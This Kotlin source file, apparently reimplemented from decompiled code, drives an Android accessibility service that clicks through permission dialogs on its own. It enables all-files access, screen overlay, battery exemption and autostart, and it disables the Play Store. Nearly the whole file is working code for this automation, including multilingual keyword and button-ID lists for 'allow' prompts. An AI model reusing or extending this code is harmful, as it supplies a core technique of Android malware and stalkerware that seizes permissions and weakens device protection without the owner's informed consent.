package com.storm.safe.rock.service.modules.yw5xud.generic

import android.content.Context
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.VendorSteps
import com.storm.safe.rock.service.modules.yw5xud.common.AllowKeywords

/**
 * GenericSteps — AOSP/universal permission automation orchestrator.
 * Matches vendor C0364a1 (a1). Runs on all devices as the final step.
 *
 * Vendor execute flow order (m212128a8):
 *   1. [Xiaomi only] Autostart management (m212135b5)
 *   2. Files permission / All files access (m212129a9)
 *   3. Runtime permissions (m212130b0)
 *   4. Draw overlay (m212133b3)
 *   5. Disable Play Store (m212134b4)
 *   6. Battery optimization (m212131b1)
 *   7. Notification channel (m212132b2)
 *   8. [Xiaomi only] Background management (m212136b6)
 *
 * Implementation is split across delegate classes:
 * - [GenericAllFiles] — all files access (MANAGE_EXTERNAL_STORAGE)
 * - [GenericBasicPerms] — runtime permissions via umrkmgrri
 * - [GenericOverlay] — draw over other apps
 * - [GenericBattery] — battery optimization exemption
 * - [GenericMisc] — xiaomi autostart, play store, notification, xiaomi bg mgmt
 */
class GenericSteps(
    service: MyAccessibilityService?,
    context: Context,
    ui: UiAutomation = UiAutomation(service, context)
) : VendorSteps(service, context, ui) {
    override val tag = "GenericSteps"
    companion object {
        private const val TAG = "GenericSteps"

        /** Max retry for overlay enable (vendor a6 checks i <= 20). */
        private const val MAX_OVERLAY_RETRIES = 20

        /** Max retry for all-files-access (vendor a7 checks i > 30). */
        private const val MAX_FILES_RETRIES = 30

        /** Default page-stable wait constants. JADX: m212294f9 pattern. */
        private const val STABLE_REQUIRED_COUNT = 2
        private const val STABLE_POLL_INTERVAL_MS = 100L
        private const val STABLE_TIMEOUT_MS = 2000L
        private const val POST_LAUNCH_WAIT_MS = 3000L

        /** Multi-language "unrestricted" keywords for battery settings. Vendor pattern. */
        val BATTERY_UNRESTRICTED_KEYWORDS = listOf(
            "无限制", "不限制", "無限制", "不採取任何限制措施",
            "Unrestricted", "No restrictions", "No restriction",
            "Tidak dibatasi", "Không hạn chế", "ไม่จำกัด"
        )

        /**
         * Vendor-aligned permission allow button IDs.
         * Matches C0364a1 constructor list (f55051a4).
         */
        val PERMISSION_ALLOW_IDS: List<String> = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.packageinstaller:id/permission_allow_always_button",
            "com.android.packageinstaller:id/permission_allow_foreground_only_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "com.google.android.permissioncontroller:id/permission_allow_button",
            "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.samsung.android.packageinstaller:id/permission_allow_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.huawei.systemmanager:id/btn_allow",
            "com.huawei.packageinstaller:id/permission_allow_button",
            "com.lbe.security.miui:id/permission_allow_foreground_only_button",
            "com.miui.securitycenter:id/accept",
            "miui:id/grant",
            "miui:id/button2",
            "miui:id/action_positive",
            "com.android.settings:id/left_button",
            "android:id/button1"
        )

        /**
         * Overlay switch view IDs checked by vendor overlay flow.
         * Matches vendor a6 inner ViewID list.
         */
        val OVERLAY_SWITCH_IDS: List<String> = listOf(
            "com.android.settings:id/switch_widget",
            "com.android.settings:id/switchWidget",
            "android:id/switch_widget",
            "android:id/checkbox",
            "com.android.settings:id/switch_bar",
            "com.android.settings:id/switch_text",
            "com.samsung.android.settings:id/switch_widget"
        )

        /** All-files-access toggle keywords. MIUI: 允许管理所有文件. AOSP: Allow access to manage all files. */
        val ALL_FILES_ALLOW_KEYWORDS: List<String> = listOf(
            "允许管理所有文件", "允许访问全部", "允許管理所有檔案", "允許存取所有檔案",
            "允许所有文件访问", "允許所有檔案存取",
            "授予管理所有文件的权限", "授予存取所有檔案的權限",  // MIUI 15 Switch content-desc
            "管理所有文件", "管理外部存储",                      // 更宽松的部分匹配
            "Allow access to manage all files", "Allow management of all files",
            "Permit all files access", "Grant permission to manage all files"
        )

        /** Max iterations for autoToggleAllFilesAccess. 降为 5 避免长时间阻塞 */
        const val ALL_FILES_TOGGLE_MAX_ITERATIONS: Int = 5

        /** Interval between iterations (ms). */
        const val ALL_FILES_TOGGLE_INTERVAL_MS: Long = 1000L

        /** Absolute deadline for ALL_FILES toggle loop (ms). 6s 后强制跳出，不阻塞后续流程 */
        const val ALL_FILES_TOGGLE_DEADLINE_MS: Long = 6_000L

        /** Max consecutive "no switch found" failures before giving up. */
        const val ALL_FILES_MAX_CONSECUTIVE_NO_SWITCH: Int = 3
    }

    /** Flow types matching vendor GenericSteps$FlowType. */
    enum class FlowType {
        BATTERY_OPTIMIZATION,
        OVERLAY_PERMISSION,
        NOTIFICATION_CHANNEL,
        ALL_FILES_ACCESS,
        PLAY_STORE_DISABLE,
        BASIC_PERMISSIONS,
        XIAOMI_AUTOSTART,
        XIAOMI_BG_MANAGEMENT
    }

    // ── Delegates ────────────────────────────────────────────────────

    private val allFiles = GenericAllFiles(service, context, ui, this)
    private val basicPerms = GenericBasicPerms(service, context, ui, this)
    private val overlay = GenericOverlay(service, context, ui, this)
    private val battery = GenericBattery(service, context, ui, this)
    private val misc = GenericMisc(service, context, ui, this)

    // ── Orchestrator ─────────────────────────────────────────────────

    /**
     * Execute all generic permission flows.
     * Called by Yw5xudHandler.executeGenericSteps().
     *
     * Vendor flow order (m212128a8):
     *   Xiaomi autostart -> all files -> basic perms -> overlay ->
     *   play store -> battery opt -> notification -> xiaomi bg mgmt
     */
    override suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("GenericSteps: 开始通用权限配置")

        // Vendor order per m212128a8 switch/case
        misc.executeXiaomiAutostart(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        allFiles.execute(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        basicPerms.execute(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        overlay.execute(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        misc.executePlayStoreDisable(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        battery.execute(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        misc.executeNotificationChannel(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        misc.executeXiaomiBgManagement(successes, failures, logs)

        logs.add("GenericSteps: 通用权限配置完成")
    }

    // ── Shared utilities (used by delegates) ─────────────────────────

    /**
     * Wait until the accessibility root window node count stabilizes.
     * Matches vendor waitForPageStable pattern used across all Steps classes.
     */
    suspend fun waitForPageStable(
        requiredStableCount: Int = STABLE_REQUIRED_COUNT,
        pollIntervalMs: Long = STABLE_POLL_INTERVAL_MS,
        timeoutMs: Long = STABLE_TIMEOUT_MS
    ): Boolean {
        return ui.waitForPageStable(requiredStableCount, pollIntervalMs, timeoutMs)
    }

    /**
     * Delay in small chunks (100ms) to stay responsive to cancellation.
     * Matches vendor interruptibleDelay pattern.
     */
    suspend fun interruptibleDelay(totalMs: Long) {
        ui.interruptibleDelay(totalMs)
    }

    // ── Public utility methods (used by delegates and external callers) ──

    /**
     * DFS collect all text from node tree.
     * Matches vendor m212114a1().
     */
    fun collectAllTexts(root: AccessibilityNodeInfo): List<String> {
        val results = mutableListOf<String>()
        collectTextsRecursive(root, results)
        return results
    }

    private fun collectTextsRecursive(node: AccessibilityNodeInfo, results: MutableList<String>) {
        try {
            node.text?.toString()?.takeIf { it.isNotBlank() }?.let { results.add(it) }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { collectTextsRecursive(it, results) }
            }
        } catch (_: Exception) { /* swallow per vendor */ }
    }

    /**
     * Find all toggle-like nodes (Switch/Toggle/CheckBox/CompoundButton).
     * Matches vendor m212116b7(): DFS with maxDepth=15, checks className contains.
     */
    fun findAllToggles(
        root: AccessibilityNodeInfo,
        maxDepth: Int = 15
    ): List<AccessibilityNodeInfo> {
        val results = mutableListOf<AccessibilityNodeInfo>()
        findTogglesRecursive(0, root, results, maxDepth)
        return results
    }

    private fun findTogglesRecursive(
        depth: Int,
        node: AccessibilityNodeInfo,
        results: MutableList<AccessibilityNodeInfo>,
        maxDepth: Int
    ) {
        if (depth > maxDepth) return
        try {
            val className = node.className?.toString() ?: ""
            if (isToggleClassName(className) && node.isVisibleToUser) {
                results.add(node)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { findTogglesRecursive(depth + 1, it, results, maxDepth) }
            }
        } catch (_: Exception) { /* swallow per vendor */ }
    }

    /**
     * Click node or walk up to clickable parent (max 3 levels).
     * Matches vendor m212115a3().
     */
    fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 3) {
            if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
            val grandparent = parent.parent
            parent.recycle()
            parent = grandparent
            depth++
        }
        return false
    }

    /**
     * Find first checkable toggle by DFS.
     * Matches vendor m212117b8(): checks isCheckable() AND isVisibleToUser AND
     * className contains Switch/Toggle/CheckBox/Compound.
     */
    fun findFirstToggle(
        root: AccessibilityNodeInfo,
        maxDepth: Int = 15
    ): AccessibilityNodeInfo? {
        return findFirstToggleRecursive(root, 0, maxDepth)
    }

    private fun findFirstToggleRecursive(
        node: AccessibilityNodeInfo,
        depth: Int,
        maxDepth: Int
    ): AccessibilityNodeInfo? {
        if (depth > maxDepth) return null
        try {
            // Vendor b8: checks isCheckable AND isVisibleToUser first, then className
            if (node.isCheckable && node.isVisibleToUser) {
                val className = node.className?.toString() ?: ""
                if (className.contains("Switch", ignoreCase = true) ||
                    className.contains("Toggle", ignoreCase = true) ||
                    className.contains("CheckBox", ignoreCase = true) ||
                    className.contains("Compound", ignoreCase = true)
                ) {
                    return node
                }
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val found = findFirstToggleRecursive(child, depth + 1, maxDepth)
                if (found != null) return found
            }
        } catch (_: Exception) { /* swallow per vendor */ }
        return null
    }

    /**
     * Dispatch a gesture tap at the center of a node's bounds.
     * Uses 100ms stroke duration per vendor pattern.
     */
    fun dispatchGestureClick(node: AccessibilityNodeInfo): Boolean {
        return try {
            val rect = android.graphics.Rect()
            node.getBoundsInScreen(rect)
            if (rect.width() <= 0 || rect.height() <= 0) return false
            dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
            true
        } catch (_: Exception) { false }
    }

    /** Dispatch gesture click at coordinates. Vendor m212123a2: duration 100ms. */
    internal fun dispatchGestureClick(x: Float, y: Float) {
        val path = android.graphics.Path()
        path.moveTo(x, y)
        val gesture = android.accessibilityservice.GestureDescription.Builder()
            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 100L))
            .build()
        service?.dispatchGesture(gesture, null, null)
    }

    /**
     * Scroll forward in the current view. Finds first scrollable node and performs ACTION_SCROLL_FORWARD.
     */
    fun scrollForward(root: AccessibilityNodeInfo): Boolean {
        val scrollable = ui.query("[scrollable=true]")
        if (scrollable != null) {
            return scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
        }
        return false
    }

    /**
     * Check if current root window is a permission controller.
     * Matches vendor m212139c3(): checks root package against known permission controllers.
     */
    fun isPermissionControllerWindow(): Boolean {
        val root = service?.rootInActiveWindow ?: return false
        val pkg = root.packageName?.toString() ?: ""
        return pkg.contains("com.android.permissioncontroller") ||
            pkg.contains("com.google.android.permissioncontroller") ||
            pkg.contains("com.android.packageinstaller") ||
            pkg.contains("com.google.android.packageinstaller")
    }

    /**
     * Try to click any visible permission allow button.
     * Matches vendor m212122a0(): iterates PERMISSION_ALLOW_IDS via findAccessibilityNodeInfosByViewId.
     */
    fun clickPermissionAllowButton(): Boolean {
        val root = service?.rootInActiveWindow ?: return false
        return clickPermissionAllowButton(root)
    }

    /**
     * Overload accepting an explicit root — testable without a live AccessibilityService.
     *
     * Path 1 (vendor L250-267): iterate PERMISSION_ALLOW_IDS via findAccessibilityNodeInfosByViewId;
     *                            on match, performAction(ACTION_CLICK) and return.
     * Path 2 (vendor L268-294): fallback — iterate AllowKeywords.ALLOW multilingual keyword list via
     *                            findAccessibilityNodeInfosByText; for each visible match, try click on
     *                            the node itself, else walk up to 5 parent levels looking for a clickable
     *                            ancestor. Vendor parent-climb depth is 5 (not 3).
     *
     * Vendor does NOT check isEnabled() and does NOT filter CANCEL_NO (relies purely on ALLOW list
     * being distinct from CANCEL_NO). Replica follows vendor exactly here.
     */
    internal fun clickPermissionAllowButton(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        // Path 1 — viewId lookup (vendor L250-267)
        for (buttonId in PERMISSION_ALLOW_IDS) {
            try {
                val nodes = root.findAccessibilityNodeInfosByViewId(buttonId)
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    try {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        node.recycle()
                        return true
                    } catch (_: Exception) { /* continue */ }
                }
            } catch (_: Exception) { /* continue */ }
        }
        // Path 2 — text fallback (vendor L268-294)
        // Aligns with vendor AbstractC0363a0.f55044a0.getValue() == allow-keyword list.
        for (keyword in AllowKeywords.ALLOW) {
            val nodes = try {
                root.findAccessibilityNodeInfosByText(keyword)
            } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                try {
                    if (!node.isVisibleToUser) {
                        try { node.recycle() } catch (_: Exception) {}
                        continue
                    }
                    if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        return true
                    }
                    // Walk up to 5 parent levels (vendor i < 5).
                    var parent: AccessibilityNodeInfo? = try { node.parent } catch (_: Exception) { null }
                    var i = 0
                    while (parent != null && i < 5) {
                        if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                            return true
                        }
                        val next = try { parent.parent } catch (_: Exception) { null }
                        try { parent.recycle() } catch (_: Exception) {}
                        i++
                        parent = next
                    }
                    try { node.recycle() } catch (_: Exception) {}
                } catch (_: Exception) { /* continue */ }
            }
        }
        return false
    }

    // ── Internal helpers ─────────────────────────────────────────────

    /**
     * Check if className represents a toggle widget.
     * Vendor b7 checks: Switch, Toggle, CheckBox, CompoundButton.
     */
    private fun isToggleClassName(className: String): Boolean {
        return className.contains("Switch") ||
            className.contains("Toggle") ||
            className.contains("CheckBox") ||
            className.contains("CompoundButton")
    }

    /**
     * Xiaomi brand check. Matches vendor m212120c4():
     * Build.BRAND or Build.MANUFACTURER in {xiaomi, redmi, poco}.
     */
    internal fun isXiaomiBrand(): Boolean {
        val brand = Build.BRAND.lowercase()
        val manufacturer = Build.MANUFACTURER.lowercase()
        val xiaomiBrands = listOf("xiaomi", "redmi", "poco")
        return xiaomiBrands.contains(brand) || xiaomiBrands.contains(manufacturer)
    }
}
